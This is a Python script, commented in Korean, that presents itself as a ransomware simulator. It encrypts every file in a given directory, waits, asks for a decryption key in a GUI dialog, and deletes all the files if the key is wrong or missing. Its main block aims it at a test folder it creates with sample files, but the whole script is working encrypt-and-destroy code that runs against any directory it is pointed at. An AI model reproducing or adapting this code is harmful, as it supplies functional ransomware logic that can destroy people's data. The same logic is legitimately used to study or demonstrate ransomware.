import os
import time
import tkinter as tk
from tkinter import simpledialog, messagebox
from cryptography.fernet import Fernet

# 암호화 키 생성 함수
def generate_key():
    return Fernet.generate_key()

# 파일 암호화 함수
def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original_data = file.read()

    encrypted_data = fernet.encrypt(original_data)

    with open(file_path, 'wb') as file:
        file.write(encrypted_data)

# 파일 복호화 함수
def decrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        encrypted_data = file.read()

    decrypted_data = fernet.decrypt(encrypted_data)

    with open(file_path, 'wb') as file:
        file.write(decrypted_data)

# 파일 삭제 함수
def delete_file(file_path):
    os.remove(file_path)

# 복호화 키 입력 GUI (tkinter)
def request_decryption_key():
    root = tk.Tk()
    root.withdraw()  # 창을 숨김

    key = simpledialog.askstring("Decrypt Key", "Enter the decryption key:", show='*')
    
    if key:
        return key.encode()  # 입력 받은 키를 바이트로 변환
    else:
        messagebox.showinfo("Failure", "No key entered. Files will be deleted.")
        return None

# 랜섬웨어 시뮬레이터 실행
def ransomware_simulator(directory, key, timeout=30):
    # 파일 암호화
    for filename in os.listdir(directory):
        file_path = os.path.join(directory, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, key)
            print(f"Encrypted: {file_path}")

    # 타이머 시작
    print(f"Waiting {timeout} seconds for decryption key...")
    time.sleep(timeout)

    # 사용자에게 복호화 키 요청 (GUI)
    entered_key = request_decryption_key()

    if entered_key is None or entered_key != key:
        # 잘못된 키 입력 시 파일 삭제
        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path):
                delete_file(file_path)
                print(f"Deleted: {file_path}")
        print("Files deleted due to incorrect or missing decryption key.")
    else:
        # 올바른 키 입력 시 파일 복호화
        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            if os.path.isfile(file_path):
                decrypt_file(file_path, key)
                print(f"Decrypted: {file_path}")
        messagebox.showinfo("Success", "Files decrypted successfully.")

# 테스트 디렉토리 및 실행
if __name__ == "__main__":
    test_directory = r"C:\Users\GHOSTSEC\Desktop\ransomeware_simulator"  # 테스트할 디렉토리 경로
    os.makedirs(test_directory, exist_ok=True)  # 테스트용 폴더 생성

    # 예시 파일 생성
    with open(os.path.join(test_directory, "test1.txt"), "w") as file:
        file.write("This is a test file.")

    with open(os.path.join(test_directory, "test2.txt"), "w") as file:
        file.write("Another test file.")

    # 암호화 키 생성
    encryption_key = generate_key()

    # 생성된 암호화 키 출력 (복호화에 사용)
    print(f"Encryption Key (Keep this safe): {encryption_key.decode()}")

    # 랜섬웨어 시뮬레이터 실행
    ransomware_simulator(test_directory, encryption_key, timeout=30)
